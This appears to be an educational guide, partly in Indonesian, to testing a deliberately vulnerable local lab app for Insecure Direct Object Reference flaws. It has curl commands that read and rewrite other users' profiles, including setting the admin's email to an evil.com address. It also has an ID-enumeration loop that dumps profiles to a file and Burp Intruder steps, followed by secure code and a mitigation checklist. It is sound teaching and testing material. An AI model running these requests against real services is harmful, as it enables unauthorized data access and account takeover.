# IDOR (Insecure Direct Object Reference) Testing Guide

## Konsep IDOR

IDOR terjadi ketika aplikasi menggunakan referensi langsung ke objek internal (seperti ID user, file, dll) tanpa validasi authorization yang proper.

## 1. Profile Viewing (Read IDOR)

### Normal Flow
1. Login sebagai `andi` (user ID: 2)
2. Akses profile sendiri: `http://localhost:3000/profile/2`
3. Anda melihat data andi

### IDOR Exploit
1. Masih login sebagai `andi`
2. Ubah URL menjadi: `http://localhost:3000/profile/1`
3. **Result**: Anda bisa melihat profile hilmy (admin)!
4. Try: `/profile/3`, `/profile/4` untuk user lain

### Test dengan API
```bash
# View any user profile
curl http://localhost:5000/api/users/1
curl http://localhost:5000/api/users/2
curl http://localhost:5000/api/users/3
```

**Expected**: Semua request berhasil tanpa authorization check!

## 2. Profile Editing (Write IDOR)

### Normal Flow
User seharusnya hanya bisa edit profile sendiri.

### IDOR Exploit
1. Login sebagai `andi` (ID: 2)
2. Akses: `http://localhost:3000/profile/1` (hilmy)
3. Klik tombol "Edit Profile"
4. Ubah email hilmy
5. **Result**: Email hilmy berhasil diubah!

### Test dengan API
```bash
# Change admin email (while logged in as john)
curl -X PUT http://localhost:5000/api/users/1 \
  -H "Content-Type: application/json" \
  -d '{"email":"hacked@evil.com"}'

# Verify change
curl http://localhost:5000/api/users/1
```

## 3. Enumerating Users

### List All Users
```bash
curl http://localhost:5000/api/users
```

**Result**: Mendapatkan list semua user dengan ID mereka.

### Brute Force User IDs
```bash
for i in {1..10}; do
  echo "Testing ID: $i"
  curl http://localhost:5000/api/users/$i
done
```

## 4. Advanced IDOR Testing

### Test Scenarios

1. **Horizontal Privilege Escalation**
   - User biasa akses data user biasa lain
   - Andi (user) → Dika (user)

2. **Vertical Privilege Escalation**
   - User biasa akses/ubah data admin
   - Andi (user) → Hilmy (admin)

3. **Predictable IDs**
   - IDs are sequential (1, 2, 3, ...)
   - Easy to guess and enumerate

## 5. Using Burp Suite

### Setup
1. Configure browser proxy → Burp (localhost:8080)
2. Login ke aplikasi
3. Navigate ke profile page

### Intercept & Modify
1. Intercept GET request to `/api/users/2`
2. Change ID: `/api/users/2` → `/api/users/1`
3. Forward request
4. **Observe**: You get admin data!

### Automate with Intruder
1. Send request to Intruder
2. Mark user ID as payload position: `/api/users/§2§`
3. Payload type: Numbers (1-10)
4. Start attack
5. Analyze responses

## 6. Impact Assessment

### What can attacker do?

✅ **View sensitive data:**
- Email addresses
- User IDs
- Account creation dates
- User roles

✅ **Modify other users' data:**
- Change email addresses
- Potentially change passwords (if endpoint exists)
- Modify profile information

✅ **Enumerate users:**
- Discover all user IDs
- Map user base

## 7. Real-World Examples

```bash
# Scenario 1: Change victim's email to attacker's
curl -X PUT http://localhost:5000/api/users/3 \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@evil.com"}'

# Scenario 2: Enumerate admin accounts
curl http://localhost:5000/api/users | grep "hilmy"

# Scenario 3: Mass profile extraction
for id in {1..100}; do
  curl http://localhost:5000/api/users/$id >> users_dump.json
done
```

## 8. Mitigation Strategies

### ❌ Vulnerable Code
```javascript
app.get('/api/users/:id', async (req, res) => {
  const { id } = req.params;
  const user = await getUser(id);
  res.json(user);
});
```

### ✅ Secure Code
```javascript
app.get('/api/users/:id', authenticateToken, async (req, res) => {
  const { id } = req.params;
  
  // Authorization check
  if (req.user.id !== parseInt(id) && req.user.role !== 'admin') {
    return res.status(403).json({ 
      error: 'Unauthorized: You can only access your own profile' 
    });
  }
  
  const user = await getUser(id);
  res.json(user);
});
```

### Key Points:
1. **Always authenticate** - Verify user identity
2. **Always authorize** - Check if user has permission
3. **Use indirect references** - UUID instead of sequential IDs
4. **Implement access control** - Check ownership before any operation

## 9. Prevention Checklist

- [ ] Implement authentication (JWT, sessions)
- [ ] Add authorization checks on every endpoint
- [ ] Use UUIDs instead of sequential IDs
- [ ] Log access attempts for monitoring
- [ ] Implement rate limiting
- [ ] Use access control matrices
- [ ] Test with different user roles

## 10. Documentation for Report

### Template
```
Vulnerability: IDOR (Insecure Direct Object Reference)
Severity: HIGH
Endpoint: /api/users/:id

Steps to Reproduce:
1. Login as user 'john' (ID: 2)
2. Access URL: http://localhost:5000/api/users/1
3. Observe: Admin profile data is returned
4. Send PUT request to modify admin's email
5. Verify: Email successfully changed

Impact:
- Unauthorized access to sensitive user data
- Ability to modify other users' profiles
- Horizontal and vertical privilege escalation

Recommendation:
Implement proper authorization checks to ensure
users can only access/modify their own resources.
```

## Tools

- Burp Suite (Intruder, Repeater)
- OWASP ZAP
- Postman
- cURL
- Custom scripts

Happy (Ethical) Hacking! 🔐
